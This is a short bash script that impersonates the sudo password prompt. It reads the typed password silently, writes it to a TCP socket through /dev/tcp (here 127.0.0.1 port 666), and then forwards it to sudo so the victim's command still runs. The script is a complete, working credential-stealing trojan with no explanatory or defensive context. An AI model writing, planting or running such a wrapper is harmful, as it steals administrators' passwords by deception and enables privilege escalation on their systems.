printf "[sudo] password for $USER: "
stty -echo
read pass
stty echo

#send pass var using /dev/tcp
echo $pass > /dev/tcp/127.0.0.1/666

echo -e "\r"
echo $pass | sudo -S $@